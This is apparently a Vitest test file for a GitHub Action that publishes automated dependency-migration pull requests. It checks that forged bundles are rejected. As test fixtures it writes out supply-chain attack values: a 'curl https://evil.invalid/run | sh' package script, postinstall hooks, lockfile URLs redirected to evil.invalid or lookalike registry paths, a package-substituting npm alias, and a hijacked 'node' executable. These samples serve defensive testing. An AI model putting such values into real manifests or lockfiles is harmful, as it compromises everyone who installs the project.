import { describe, expect, it, vi } from 'vitest';
import { readFileSync } from 'node:fs';
import { mkdtemp, readFile, rm, writeFile, mkdir } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { runRealSdkNpm } from './helpers/real-sdk-command.js';
import { Project } from 'ts-morph';
import { firebaseAdminV14 } from '../src/migrations/firebase-admin-v14/index.js';
import { validateProposal, validateProposalEnvelope, validatePublishableBundle, parseExactRemoteHead, reconcileProposal, parseSafeRawDiff, parseCommitParents, findManagedIssue, findManagedIssuePaginated, isDismissedClosure, isDismissedManualIssueForProposal, type Proposal, type ProposalPublisher } from '../src/action/publish.js';
import { assertSafeNpmLockfileInputs, regenerateNpmLockfile } from '../src/action/regenerate-lock.js';

const base = 'a'.repeat(40);
const commit = 'b'.repeat(40);
const proposal: Proposal = {
  schema: 1, migration: 'firebase-admin@14', status: 'ready', base, branch: 'upstreamfix/firebase-admin-14',
  commit, files: ['package.json', 'server.ts'], verification: 'passed', report: '# Safe report',
  reviewers: ['ivanDev237'], labels: ['dependencies'],
};

describe('Action publication boundary', () => {
  it('P10 rejects an added Node type package bundled with any unrelated devDependency', () => {
    const identity = { author: 'upstreamfix[bot]', authorEmail: '41898282+github-actions[bot]@users.noreply.github.com', committer: 'upstreamfix[bot]', committerEmail: '41898282+github-actions[bot]@users.noreply.github.com', subject: 'Apply openai@5 migration with UpstreamFix' };
    const before = '{"name":"client","dependencies":{"openai":"^4.0.0"}}';
    const after = '{"name":"client","dependencies":{"openai":"^5.0.0"},"devDependencies":{"@types/node":"^20.0.0","evil-pkg":"^1.0.0"}}';
    expect(() => validatePublishableBundle({ ...proposal, migration: 'openai@5', files: ['package.json'] },
      { 'package.json': { before, after } }, identity)).toThrow(/package.json|deterministic|unexpected/i);
  });
  it('P10 rejects duplicate package manifest keys at the publication boundary', () => {
    const identity = { author: 'upstreamfix[bot]', authorEmail: '41898282+github-actions[bot]@users.noreply.github.com', committer: 'upstreamfix[bot]', committerEmail: '41898282+github-actions[bot]@users.noreply.github.com', subject: 'Apply openai@5 migration with UpstreamFix' };
    const before = '{"dependencies":{"openai":"^4.0.0"}}';
    const after = '{"dependencies":{"openai":"^5.0.0"},"scripts":{},"scripts":{"postinstall":"evil"}}';
    expect(() => validatePublishableBundle({ ...proposal, migration: 'openai@5', files: ['package.json'] },
      { 'package.json': { before, after } }, identity)).toThrow(/duplicate|invalid JSON/i);
  });
  it('Z4 permits a nested executable with an existing name and a moved entry point', () => {
    const identity = { author: 'upstreamfix[bot]', authorEmail: '41898282+github-actions[bot]@users.noreply.github.com', committer: 'upstreamfix[bot]', committerEmail: '41898282+github-actions[bot]@users.noreply.github.com', subject: 'Apply firebase-admin@14 migration with UpstreamFix' };
    const before = JSON.stringify({ lockfileVersion: 3, packages: { '': {}, 'node_modules/mime': { bin: { mime: 'old.js' } } } });
    const after = JSON.stringify({ lockfileVersion: 3, packages: { '': {}, 'node_modules/mime': { bin: { mime: 'new.js' } }, 'node_modules/dep/node_modules/mime': { bin: { mime: 'cli.js' } } } });
    expect(() => validatePublishableBundle({ ...proposal, files: ['package-lock.json'] }, { 'package-lock.json': { before, after } }, identity, { 'package-lock.json': after })).not.toThrow();
  });
  it('Z4 refuses non-registry dependency specs before independent lockfile regeneration', async () => {
    const before = JSON.stringify({ lockfileVersion: 3, packages: { '': {} } });
    await expect(regenerateNpmLockfile(before, JSON.stringify({ dependencies: { x: 'git+https://example.test/x.git' } }), 'package-lock.json')).rejects.toThrow(/registry|dependency|spec/i);
  });
  it('Z4 accepts wildcard transitive dependencies from a real Firebase lockfile', () => {
    const before = readFileSync(new URL('./fixtures/firebase-lockfiles/13-to-14-before.json', import.meta.url), 'utf8');
    expect(() => assertSafeNpmLockfileInputs(before, JSON.stringify({ dependencies: { 'firebase-admin': '^14.0.0' } }))).not.toThrow();
  });
  it('Z4 displays previously escaped punctuation inside the quoted report', async () => {
    let body = '';
    const publisher: ProposalPublisher = {
      findPullRequest: async () => undefined, pushBranch: async () => undefined,
      openPullRequest: async (value) => { body = value; }, updatePullRequest: async () => undefined,
      closePullRequest: async () => undefined, upsertIssue: async () => undefined, closeIssue: async () => undefined,
    };
    await reconcileProposal({ ...proposal, report: 'array&#91;0&#93; &#124; test&#33;' }, publisher);
    expect(body).toContain('array[0] | test!');
  });
  it('Z2 accepts a recent lockfile cutoff and rejects stale or future proposal cutoffs', () => {
    const timestamp = new Date(Date.now() - 10 * 60_000).toISOString();
    expect(() => validateProposalEnvelope({ ...proposal, registryBefore: timestamp }, base)).not.toThrow();
    expect(() => validateProposalEnvelope({ ...proposal, registryBefore: new Date(Date.now() - 3 * 60 * 60_000).toISOString() }, base)).toThrow(/cutoff|time|expired/i);
    expect(() => validateProposalEnvelope({ ...proposal, registryBefore: new Date(Date.now() + 60_000).toISOString() }, base)).toThrow(/cutoff|time|future/i);
  });
  it('W13 accepts only the exact remote branch ref', () => {
    expect(parseExactRemoteHead(`${base}\trefs/heads/upstreamfix/firebase-admin-14\n`, 'upstreamfix/firebase-admin-14')).toBe(base);
    expect(() => parseExactRemoteHead(`${base}\trefs/heads/upstreamfix/firebase-admin-14/evil\n`, 'upstreamfix/firebase-admin-14')).toThrow(/remote/i);
  });
  it('W13 neutralizes links, images, and issue references in untrusted reports', async () => {
    let body = '';
    const publisher: ProposalPublisher = {
      findPullRequest: async () => undefined, pushBranch: async () => undefined,
      openPullRequest: async (value) => { body = value; }, updatePullRequest: async () => undefined,
      closePullRequest: async () => undefined, upsertIssue: async () => undefined, closeIssue: async () => undefined,
    };
    await reconcileProposal({ ...proposal, report: '[click](https://evil.invalid) ![pixel](https://evil.invalid/pixel) #123' }, publisher);
    expect(body).toMatch(/~~~~report\n[\s\S]*\[click\]\(https:\/\/evil\.invalid\)[\s\S]*\n~~~~/);
  });
  it('X2 quotes report characters in one pass without creating new links or references', async () => {
    let body = '';
    const publisher: ProposalPublisher = {
      findPullRequest: async () => undefined, pushBranch: async () => undefined,
      openPullRequest: async (value) => { body = value; }, updatePullRequest: async () => undefined,
      closePullRequest: async () => undefined, upsertIssue: async () => undefined, closeIssue: async () => undefined,
    };
    await reconcileProposal({ ...proposal, report: 'a@b [x] #12 ! www.example.test GH-123 &gt; <x>' }, publisher);
    expect(body).toContain('~~~~report\na@b [x] #12 ! www.example.test GH-123 &gt; <x>\n~~~~');
    expect(body).not.toContain('&&#35;');
  });
  it('Y6 keeps untrusted addresses and mention-like text inside a Markdown code block', async () => {
    let body = '';
    const publisher: ProposalPublisher = {
      findPullRequest: async () => undefined, pushBranch: async () => undefined,
      openPullRequest: async (value) => { body = value; }, updatePullRequest: async () => undefined,
      closePullRequest: async () => undefined, upsertIssue: async () => undefined, closeIssue: async () => undefined,
    };
    await reconcileProposal({ ...proposal, report: 'a@b @octocat www.example.test mailto:a@b\n```diff\n+ [x] !\n```' }, publisher);
    expect(body).toMatch(/~~~~report\n[\s\S]*a@b @octocat/);
    expect(body).toContain('\n~~~~');
    expect(body).not.toContain('&#64;');
  });
  it('W5 rejects a forged package script, lockfile URL, and commit identity', () => {
    const before = JSON.stringify({ dependencies: { 'firebase-admin': '^13.0.0' }, scripts: { test: 'node test.js' } });
    const after = JSON.stringify({ dependencies: { 'firebase-admin': '^14.0.0' }, scripts: { test: 'curl https://evil.invalid/run | sh' } });
    const validAfter = JSON.stringify({ dependencies: { 'firebase-admin': '^14.0.0' }, scripts: { test: 'node test.js' } });
    const lockBefore = JSON.stringify({ lockfileVersion: 3, packages: { '': { dependencies: { 'firebase-admin': '^13.0.0' } }, 'node_modules/firebase-admin': { version: '13.0.0', resolved: 'https://registry.npmjs.org/firebase-admin/-/firebase-admin-13.0.0.tgz', integrity: 'sha512-old' } } });
    const lockAfter = JSON.stringify({ lockfileVersion: 3, packages: { '': { dependencies: { 'firebase-admin': '^14.0.0' } }, 'node_modules/firebase-admin': { version: '14.0.0', resolved: 'https://evil.invalid/firebase-admin.tgz', integrity: 'sha512-new' } } });
    const identity = { author: 'upstreamfix[bot]', authorEmail: '41898282+github-actions[bot]@users.noreply.github.com', committer: 'upstreamfix[bot]', committerEmail: '41898282+github-actions[bot]@users.noreply.github.com', subject: 'Apply firebase-admin@14 migration with UpstreamFix' };
    expect(() => validatePublishableBundle({ ...proposal, files: ['package.json'] }, { 'package.json': { before, after } }, identity)).toThrow(/package.json/i);
    expect(() => validatePublishableBundle({ ...proposal, files: ['package.json', 'package-lock.json'] }, { 'package.json': { before, after: validAfter }, 'package-lock.json': { before: lockBefore, after: lockAfter } }, identity)).toThrow(/registry|lockfile/i);
    expect(() => validatePublishableBundle({ ...proposal, files: ['package.json'] }, { 'package.json': { before, after: validAfter } }, { ...identity, author: 'attacker' })).toThrow(/identity/i);
  });
  it('X1 rejects a scoped lookalike URL and extra lockfile capabilities', () => {
    const before = JSON.stringify({ lockfileVersion: 3, packages: { '': { dependencies: { 'firebase-admin': '^13.0.0' } }, 'node_modules/firebase-admin': { version: '13.0.0' } } });
    const entry = { version: '14.0.0', resolved: 'https://registry.npmjs.org/firebase-admin/-/firebase-admin-14.0.0.tgz', integrity: 'sha512-QUJDRA==' };
    const valid = JSON.stringify({ lockfileVersion: 3, packages: { '': { dependencies: { 'firebase-admin': '^14.0.0' } }, 'node_modules/firebase-admin': entry } });
    const candidate = { ...proposal, files: ['package-lock.json'] };
    const identity = { author: 'upstreamfix[bot]', authorEmail: '41898282+github-actions[bot]@users.noreply.github.com', committer: 'upstreamfix[bot]', committerEmail: '41898282+github-actions[bot]@users.noreply.github.com', subject: 'Apply firebase-admin@14 migration with UpstreamFix' };
    expect(() => validatePublishableBundle(candidate, { 'package-lock.json': { before, after: valid } }, identity, { 'package-lock.json': valid })).not.toThrow();
    for (const resolved of [
      'https://registry.npmjs.org/@evil/firebase-admin/-/firebase-admin-14.0.0.tgz',
      'https://registry.npmjs.org/evil-pkg/-/firebase-admin-14.0.0.tgz',
      'https://registry.npmjs.org/evil/../firebase-admin/-/firebase-admin-14.0.0.tgz',
    ]) {
      const after = JSON.stringify({ lockfileVersion: 3, packages: { '': { dependencies: { 'firebase-admin': '^14.0.0' } }, 'node_modules/firebase-admin': { ...entry, resolved } } });
      expect(() => validatePublishableBundle(candidate, { 'package-lock.json': { before, after } }, identity, { 'package-lock.json': valid })).toThrow(/registry|lockfile/i);
    }
    for (const extras of [{ bin: { cli: 'x' } }, { dependencies: { 'evil-pkg': '1.0.0' } }, { scripts: { postinstall: 'node evil.js' } }]) {
      const after = JSON.stringify({ lockfileVersion: 3, packages: { '': { dependencies: { 'firebase-admin': '^14.0.0' } }, 'node_modules/firebase-admin': { ...entry, ...extras } } });
      expect(() => validatePublishableBundle(candidate, { 'package-lock.json': { before, after } }, identity, { 'package-lock.json': valid })).toThrow(/lockfile|unexpected/i);
    }
  });
  it('X3 accepts independently validated npm transitive changes and npm-shrinkwrap', () => {
    const identity = { author: 'upstreamfix[bot]', authorEmail: '41898282+github-actions[bot]@users.noreply.github.com', committer: 'upstreamfix[bot]', committerEmail: '41898282+github-actions[bot]@users.noreply.github.com', subject: 'Apply firebase-admin@14 migration with UpstreamFix' };
    const root = (range: string) => ({ dependencies: { 'firebase-admin': range } });
    const item = (name: string, version: string) => ({ version, resolved: `https://registry.npmjs.org/${name}/-/${name.split('/').at(-1)}-${version}.tgz`, integrity: 'sha512-QUJDRA==' });
    const before = JSON.stringify({ lockfileVersion: 3, packages: { '': root('^13.0.0'), 'node_modules/firebase-admin': item('firebase-admin', '13.10.0'), 'node_modules/old': item('old', '1.0.0') } });
    const after = JSON.stringify({ lockfileVersion: 3, packages: { '': root('^14.0.0'), 'node_modules/firebase-admin': item('firebase-admin', '14.0.0'), 'node_modules/new': item('new', '2.0.0') } });
    for (const filename of ['package-lock.json', 'npm-shrinkwrap.json']) {
      expect(() => validatePublishableBundle({ ...proposal, files: [filename] }, { [filename]: { before, after } }, identity, { [filename]: after })).not.toThrow();
    }
  });
  it('X3 accepts the committed npm-generated Firebase 13 to 14 lockfile pair', () => {
    const before = readFileSync(new URL('./fixtures/firebase-lockfiles/13-to-14-before.json', import.meta.url), 'utf8');
    const after = readFileSync(new URL('./fixtures/firebase-lockfiles/13-to-14-after.json', import.meta.url), 'utf8');
    const identity = { author: 'upstreamfix[bot]', authorEmail: '41898282+github-actions[bot]@users.noreply.github.com', committer: 'upstreamfix[bot]', committerEmail: '41898282+github-actions[bot]@users.noreply.github.com', subject: 'Apply firebase-admin@14 migration with UpstreamFix' };
    expect(() => validatePublishableBundle({ ...proposal, files: ['package-lock.json'] }, { 'package-lock.json': { before, after } }, identity, { 'package-lock.json': after })).not.toThrow();
  });
  it('Y4 accepts npm v2 only when it equals the independently regenerated bytes', () => {
    const before = JSON.stringify({ lockfileVersion: 2, packages: { '': { dependencies: { 'firebase-admin': '^13.0.0' } } } });
    const after = JSON.stringify({ lockfileVersion: 2, packages: { '': { dependencies: { 'firebase-admin': '^14.0.0' } } } });
    const identity = { author: 'upstreamfix[bot]', authorEmail: '41898282+github-actions[bot]@users.noreply.github.com', committer: 'upstreamfix[bot]', committerEmail: '41898282+github-actions[bot]@users.noreply.github.com', subject: 'Apply firebase-admin@14 migration with UpstreamFix' };
    const item = { ...proposal, files: ['npm-shrinkwrap.json'] };
    expect(() => validatePublishableBundle(item, { 'npm-shrinkwrap.json': { before, after } }, identity)).toThrow(/regenerat/i);
    expect(() => validatePublishableBundle(item, { 'npm-shrinkwrap.json': { before, after } }, identity, { 'npm-shrinkwrap.json': after })).not.toThrow();
  });
  it('Y1 refuses a changed npm alias that substitutes a different published package', () => {
    const before = JSON.stringify({ lockfileVersion: 3, packages: { '': { dependencies: { 'firebase-admin': '^13.0.0' } }, 'node_modules/firebase-admin': { version: '13.0.0' }, 'node_modules/semver': { version: '7.0.0', resolved: 'https://registry.npmjs.org/semver/-/semver-7.0.0.tgz', integrity: 'sha512-QUJDRA==' } } });
    const after = JSON.stringify({ lockfileVersion: 3, packages: { '': { dependencies: { 'firebase-admin': '^14.0.0' } }, 'node_modules/firebase-admin': { version: '14.0.0', resolved: 'https://registry.npmjs.org/firebase-admin/-/firebase-admin-14.0.0.tgz', integrity: 'sha512-QUJDRA==' }, 'node_modules/semver': { name: 'evil-semver', version: '9.9.9', resolved: 'https://registry.npmjs.org/evil-semver/-/evil-semver-9.9.9.tgz', integrity: 'sha512-QUJDRA==' }, 'node_modules/other': { version: '1.0.0', resolved: 'https://registry.npmjs.org/other/-/other-1.0.0.tgz', integrity: 'sha512-QUJDRA==', dependencies: { semver: 'npm:evil-semver@9.9.9' } } } });
    const safe = JSON.parse(after) as { packages: Record<string, unknown> };
    safe.packages['node_modules/semver'] = { version: '7.0.0', resolved: 'https://registry.npmjs.org/semver/-/semver-7.0.0.tgz', integrity: 'sha512-QUJDRA==' };
    delete safe.packages['node_modules/other'];
    const identity = { author: 'upstreamfix[bot]', authorEmail: '41898282+github-actions[bot]@users.noreply.github.com', committer: 'upstreamfix[bot]', committerEmail: '41898282+github-actions[bot]@users.noreply.github.com', subject: 'Apply firebase-admin@14 migration with UpstreamFix' };
    expect(() => validatePublishableBundle({ ...proposal, files: ['package-lock.json'] }, { 'package-lock.json': { before, after } }, identity, { 'package-lock.json': JSON.stringify(safe) })).toThrow(/lockfile|regenerat/i);
  });
  it('Y2 refuses a new transitive executable named node', () => {
    const before = JSON.stringify({ lockfileVersion: 3, packages: { '': { dependencies: { 'firebase-admin': '^13.0.0' } }, 'node_modules/firebase-admin': { version: '13.0.0' } } });
    const after = JSON.stringify({ lockfileVersion: 3, packages: { '': { dependencies: { 'firebase-admin': '^14.0.0' } }, 'node_modules/firebase-admin': { version: '14.0.0', resolved: 'https://registry.npmjs.org/firebase-admin/-/firebase-admin-14.0.0.tgz', integrity: 'sha512-QUJDRA==' }, 'node_modules/evil': { version: '1.0.0', resolved: 'https://registry.npmjs.org/evil/-/evil-1.0.0.tgz', integrity: 'sha512-QUJDRA==', bin: { node: 'bin/evil.js' } } } });
    const safe = JSON.parse(after) as { packages: Record<string, unknown> };
    delete safe.packages['node_modules/evil'];
    const identity = { author: 'upstreamfix[bot]', authorEmail: '41898282+github-actions[bot]@users.noreply.github.com', committer: 'upstreamfix[bot]', committerEmail: '41898282+github-actions[bot]@users.noreply.github.com', subject: 'Apply firebase-admin@14 migration with UpstreamFix' };
    expect(() => validatePublishableBundle({ ...proposal, files: ['package-lock.json'] }, { 'package-lock.json': { before, after } }, identity, { 'package-lock.json': JSON.stringify(safe) })).toThrow(/lockfile|regenerat/i);
    expect(() => validatePublishableBundle({ ...proposal, files: ['package-lock.json'] }, { 'package-lock.json': { before, after } }, identity, { 'package-lock.json': after })).toThrow(/executable|command/i);
  });
  it('Y3 refuses every pnpm and Yarn lockfile update until independent regeneration exists', () => {
    const identity = { author: 'upstreamfix[bot]', authorEmail: '41898282+github-actions[bot]@users.noreply.github.com', committer: 'upstreamfix[bot]', committerEmail: '41898282+github-actions[bot]@users.noreply.github.com', subject: 'Apply firebase-admin@14 migration with UpstreamFix' };
    const pnpm = (version: number, url = '') => `lockfileVersion: '9.0'\nimporters:\n  .:\n    dependencies:\n      firebase-admin:\n        specifier: ^${version}.0.0\n        version: ${version}.0.0\npackages:\n  firebase-admin@${version}.0.0:\n    resolution: {integrity: sha512-QUJDRA==${url}}\nsnapshots:\n  firebase-admin@${version}.0.0: {}\n`;
    expect(() => validatePublishableBundle({ ...proposal, files: ['pnpm-lock.yaml'] }, { 'pnpm-lock.yaml': { before: pnpm(13), after: pnpm(14) } }, identity)).toThrow(/manual review/i);
    const yarn = (version: number, registry = 'registry.npmjs.org') => `firebase-admin@^${version}.0.0:\n  version "${version}.0.0"\n  resolved "https://${registry}/firebase-admin/-/firebase-admin-${version}.0.0.tgz"\n  integrity sha512-QUJDRA==\n`;
    expect(() => validatePublishableBundle({ ...proposal, files: ['yarn.lock'] }, { 'yarn.lock': { before: yarn(13), after: yarn(14) } }, identity)).toThrow(/manual review/i);
    expect(() => validatePublishableBundle({ ...proposal, files: ['yarn.lock'] }, { 'yarn.lock': { before: yarn(13), after: yarn(14, 'evil.invalid') } }, identity)).toThrow(/registry|lockfile/i);
    for (const attack of [
      pnpm(14).replace('resolution: {integrity:', 'resolution: {"tarball": "https://evil.invalid/pkg.tgz", integrity:'),
      pnpm(14).replace('resolution: {integrity:', 'resolution: &payload {tarball: "https://evil.invalid/pkg.tgz", integrity:'),
      pnpm(14).replace('resolution: {integrity:', 'resolution: {tarball: "git+https://evil.invalid/repo", integrity:'),
    ]) expect(() => validatePublishableBundle({ ...proposal, files: ['pnpm-lock.yaml'] }, { 'pnpm-lock.yaml': { before: pnpm(13), after: attack } }, identity)).toThrow(/manual review/i);
    expect(() => validatePublishableBundle({ ...proposal, files: ['yarn.lock'] }, { 'yarn.lock': { before: yarn(13), after: yarn(14) + '  resolved "https://evil.invalid/second.tgz"\n' } }, identity)).toThrow(/manual review/i);
  });
  it('X3 validates scoped Yarn Classic entries and canonical tarball fragments', () => {
    const identity = { author: 'upstreamfix[bot]', authorEmail: '41898282+github-actions[bot]@users.noreply.github.com', committer: 'upstreamfix[bot]', committerEmail: '41898282+github-actions[bot]@users.noreply.github.com', subject: 'Apply firebase-admin@14 migration with UpstreamFix' };
    const lock = (major: number) => `firebase-admin@^${major}.0.0:\n  version "${major}.0.0"\n  resolved "https://registry.npmjs.org/firebase-admin/-/firebase-admin-${major}.0.0.tgz#${'a'.repeat(40)}"\n  integrity sha512-QUJDRA==\n\n"@scope/helper@^${major}.0.0":\n  version "${major}.0.0"\n  resolved "https://registry.npmjs.org/@scope/helper/-/helper-${major}.0.0.tgz#${'b'.repeat(40)}"\n  integrity sha512-QUJDRA==\n`;
    expect(() => validatePublishableBundle({ ...proposal, files: ['yarn.lock'] }, { 'yarn.lock': { before: lock(13), after: lock(14) } }, identity)).toThrow(/manual review/i);
  });
  it('X3 rejects ambiguous duplicate package records in text lockfiles', () => {
    const identity = { author: 'upstreamfix[bot]', authorEmail: '41898282+github-actions[bot]@users.noreply.github.com', committer: 'upstreamfix[bot]', committerEmail: '41898282+github-actions[bot]@users.noreply.github.com', subject: 'Apply firebase-admin@14 migration with UpstreamFix' };
    const before = "lockfileVersion: '9.0'\nimporters:\n  .:\n    dependencies:\n      firebase-admin:\n        specifier: ^13.0.0\n        version: 13.0.0\npackages:\n  firebase-admin@13.0.0:\n    resolution: {integrity: sha512-QUJDRA==}\nsnapshots:\n  firebase-admin@13.0.0: {}\n";
    const after = before.replaceAll('13.0.0', '14.0.0') + 'packages:\n  firebase-admin@14.0.0:\n    resolution: {integrity: sha512-QUJDRA==}\n';
    expect(() => validatePublishableBundle({ ...proposal, files: ['pnpm-lock.yaml'] }, { 'pnpm-lock.yaml': { before, after } }, identity)).toThrow(/duplicate|lockfile/i);
  });
  it('X4 refuses source and configuration bytes not produced by the migration', () => {
    const identity = { author: 'upstreamfix[bot]', authorEmail: '41898282+github-actions[bot]@users.noreply.github.com', committer: 'upstreamfix[bot]', committerEmail: '41898282+github-actions[bot]@users.noreply.github.com', subject: 'Apply firebase-admin@14 migration with UpstreamFix' };
    for (const file of ['test/setup.js', 'jest.config.js', 'pnpm-workspace.yaml']) {
      expect(() => validatePublishableBundle({ ...proposal, files: [file] }, { [file]: { before: 'export default {}\n', after: 'export default { unsafe: true }\n' } }, identity)).toThrow(/bundle|source|migration|unsupported/i);
    }
    const before = "import * as admin from 'firebase-admin';\nadmin.initializeApp();\n";
    expect(() => validatePublishableBundle({ ...proposal, files: ['server.ts'] }, { 'server.ts': { before, after: 'require(\"evil\")\n' } }, identity)).toThrow(/migration|source/i);
  });
  it('allows only deterministic OpenAI @types/node and tsconfig node type additions', () => {
    const identity = { author: 'upstreamfix[bot]', authorEmail: '41898282+github-actions[bot]@users.noreply.github.com', committer: 'upstreamfix[bot]', committerEmail: '41898282+github-actions[bot]@users.noreply.github.com', subject: 'Apply openai@5 migration with UpstreamFix' };
    const beforePackage = '{"dependencies":{"openai":"^4.28.0"},"engines":{"node":">=20"}}';
    const afterPackage = '{"dependencies":{"openai":"^5.0.0"},"engines":{"node":">=20"}, "devDependencies":{"@types/node":"^20.0.0"}}';
    const beforeConfig = '{\n  "compilerOptions": {\n    "types": ["jest"]\n  }\n}\n';
    const afterConfig = '{\n  "compilerOptions": {\n    "types": ["jest", "node"]\n  }\n}\n';
    expect(() => validatePublishableBundle({ ...proposal, migration: 'openai@5', files: ['package.json', 'tsconfig.json'], commit, verification: 'passed' }, {
      'package.json': { before: beforePackage, after: afterPackage }, 'tsconfig.json': { before: beforeConfig, after: afterConfig },
    }, identity)).not.toThrow();
    expect(() => validatePublishableBundle({ ...proposal, migration: 'openai@5', files: ['package.json'], commit, verification: 'passed' }, {
      'package.json': { before: beforePackage, after: afterPackage.replace('^20.0.0', '^18.0.0') },
    }, identity)).toThrow(/@types\/node|package.json/i);
    expect(() => validatePublishableBundle({ ...proposal, migration: 'openai@5', files: ['package.json', 'tsconfig.json'], commit, verification: 'passed' }, {
      'package.json': { before: beforePackage, after: afterPackage }, 'tsconfig.json': { before: beforeConfig, after: afterConfig.replace('"jest"', '"jest", "unsafe"') },
    }, identity)).toThrow(/tsconfig|deterministic/i);
  });
  it('rejects inherited or bundle-invented tsconfig types instead of trusting them as the base list', () => {
    const identity = { author: 'upstreamfix[bot]', authorEmail: '41898282+github-actions[bot]@users.noreply.github.com', committer: 'upstreamfix[bot]', committerEmail: '41898282+github-actions[bot]@users.noreply.github.com', subject: 'Apply openai@5 migration with UpstreamFix' };
    const beforePackage = '{"dependencies":{"openai":"^4.28.0"},"engines":{"node":">=20"}}';
    const afterPackage = '{"dependencies":{"openai":"^5.0.0"},"engines":{"node":">=20"},"devDependencies":{"@types/node":"^20.0.0"}}';
    const beforeConfig = '{"compilerOptions":{"lib":["ES2022"]}}';
    const maliciousConfig = '{"compilerOptions":{"lib":["ES2022"],"types":["./evil","node"]}}';
    expect(() => validatePublishableBundle({ ...proposal, migration: 'openai@5', files: ['package.json', 'tsconfig.json'], commit, verification: 'passed' }, {
      'package.json': { before: beforePackage, after: afterPackage }, 'tsconfig.json': { before: beforeConfig, after: maliciousConfig },
    }, identity)).toThrow(/deterministic|tsconfig/i);
  });
  it('X4 accepts the exact bytes of a normal Firebase source migration', () => {
    const before = "import * as admin from 'firebase-admin';\nadmin.initializeApp();\n";
    const project = new Project({ useInMemoryFileSystem: true, skipAddingFilesFromTsConfig: true, compilerOptions: { allowJs: true } });
    project.createSourceFile('/proposal/server.ts', before);
    const after = firebaseAdminV14.transform(project).fileUpdates?.[0]?.contents;
    expect(after).toBeDefined();
    const identity = { author: 'upstreamfix[bot]', authorEmail: '41898282+github-actions[bot]@users.noreply.github.com', committer: 'upstreamfix[bot]', committerEmail: '41898282+github-actions[bot]@users.noreply.github.com', subject: 'Apply firebase-admin@14 migration with UpstreamFix' };
    expect(() => validatePublishableBundle({ ...proposal, files: ['server.ts'] }, { 'server.ts': { before, after: after! } }, identity)).not.toThrow();
  });
  it('Y6 accepts the deterministic Firebase source migration with its original BOM', () => {
    const before = "\uFEFFimport * as admin from 'firebase-admin';\nadmin.initializeApp();\n";
    const project = new Project({ useInMemoryFileSystem: true, skipAddingFilesFromTsConfig: true, compilerOptions: { allowJs: true } });
    project.createSourceFile('/proposal/server.ts', before);
    const produced = firebaseAdminV14.transform(project).fileUpdates?.[0]?.contents;
    expect(produced).toBeDefined();
    const after = produced!.startsWith('\uFEFF') ? produced! : `\uFEFF${produced}`;
    const identity = { author: 'upstreamfix[bot]', authorEmail: '41898282+github-actions[bot]@users.noreply.github.com', committer: 'upstreamfix[bot]', committerEmail: '41898282+github-actions[bot]@users.noreply.github.com', subject: 'Apply firebase-admin@14 migration with UpstreamFix' };
    expect(() => validatePublishableBundle({ ...proposal, files: ['server.ts'] }, { 'server.ts': { before, after } }, identity)).not.toThrow();
  });
  it.skipIf(process.env.UPSTREAMFIX_RUN_LOCKFILE_NETWORK_TESTS !== '1')('X3 validates a real firebase-admin 13 to 14 npm lockfile upgrade', async () => {
    const cwd = await mkdtemp(path.join(os.tmpdir(), 'upstreamfix-real-publish-lock-'));
    try {
      const manifest = (range: string) => JSON.stringify({ name: 'real-lock-fixture', version: '1.0.0', private: true, engines: { node: '>=22' }, dependencies: { 'firebase-admin': range } }, null, 2) + '\n';
      // A historical cutoff excludes packages published between this date and
      // the CI run, exercising the same registry snapshot in both jobs.
      const cutoff = '2026-09-01T00:00:00.000Z';
      await writeFile(path.join(cwd, 'package.json'), manifest('^13.10.0'));
      await runRealSdkNpm(cwd, ['install', '--package-lock-only', '--ignore-scripts', '--no-audit', '--no-fund', `--before=${cutoff}`], 180_000);
      const before = await readFile(path.join(cwd, 'package-lock.json'), 'utf8');
      await writeFile(path.join(cwd, 'package.json'), manifest('^14.0.0'));
      await runRealSdkNpm(cwd, ['install', '--package-lock-only', '--ignore-scripts', '--no-audit', '--no-fund', `--before=${cutoff}`], 180_000);
      const after = await readFile(path.join(cwd, 'package-lock.json'), 'utf8');
      const identity = { author: 'upstreamfix[bot]', authorEmail: '41898282+github-actions[bot]@users.noreply.github.com', committer: 'upstreamfix[bot]', committerEmail: '41898282+github-actions[bot]@users.noreply.github.com', subject: 'Apply firebase-admin@14 migration with UpstreamFix' };
      const fixtureRoot = process.env.UPSTREAMFIX_LOCK_FIXTURE_OUTPUT;
      if (fixtureRoot) {
        await mkdir(fixtureRoot, { recursive: true });
        await writeFile(path.join(fixtureRoot, 'before.json'), before);
        await writeFile(path.join(fixtureRoot, 'after.json'), after);
      }
      const regenerated = await regenerateNpmLockfile(before, manifest('^14.0.0'), 'package-lock.json', cutoff);
      expect(regenerated).toBe(after);
      expect(() => validatePublishableBundle({ ...proposal, files: ['package-lock.json'] }, { 'package-lock.json': { before, after } }, identity, { 'package-lock.json': regenerated })).not.toThrow();
    } finally {
      await rm(cwd, { recursive: true, force: true });
    }
  }, 420_000);
  it('T36 renders an already escaped migration report as Markdown exactly once', async () => {
    let body = '';
    const publisher: ProposalPublisher = {
      findPullRequest: async () => undefined, pushBranch: async () => undefined,
      openPullRequest: async (value) => { body = value; }, updatePullRequest: async () => undefined,
      closePullRequest: async () => undefined, upsertIssue: async () => undefined,
      closeIssue: async () => undefined,
    };
    await reconcileProposal({ ...proposal, report: '## Verification\n\n- Result: **passed**\n- Note: &gt; check \\(\\.\\)\n\n```diff\n+ getFirestore()\n```' }, publisher);
    expect(body).toContain('- Result: **passed**');
    expect(body).toContain('&gt; check');
    expect(body).not.toContain('&amp;gt;');
    expect(body).not.toContain('&#42;');
    expect(body).not.toContain('<pre>');
  });
  it('T35 searches managed issues past the tenth GitHub page', async () => {
    const target = { number: 1101, title: 'UpstreamFix: manual firebase-admin@14', body: '<!-- upstreamfix:manual:firebase-admin@14 -->', user: { login: 'github-actions[bot]' } };
    const page = Array.from({ length: 100 }, (_, index) => ({ number: index, title: 'unrelated', body: '', user: { login: 'other' } }));
    const fetchPage = vi.fn(async (number: number) => number === 11 ? [target] : page);
    expect((await findManagedIssuePaginated(fetchPage, 'firebase-admin@14'))?.number).toBe(1101);
    expect(fetchPage).toHaveBeenCalledTimes(11);
  });
  it('T35 lets a ready PR proceed after a human closes a manual issue, unless explicitly dismissed', () => {
    const closed = { state: 'closed', labels: [] };
    const events = [{ event: 'closed', actor: { login: 'maintainer' } }];
    expect(isDismissedManualIssueForProposal(closed, events, 'ready')).toBe(false);
    expect(isDismissedManualIssueForProposal(closed, events, 'manual')).toBe(true);
    expect(isDismissedManualIssueForProposal({ state: 'closed', labels: [{ name: 'upstreamfix:dismissed' }] }, events, 'ready')).toBe(true);
  });
  it('T35 dispatches client CI when a bot-closed PR is reopened without a branch push', () => {
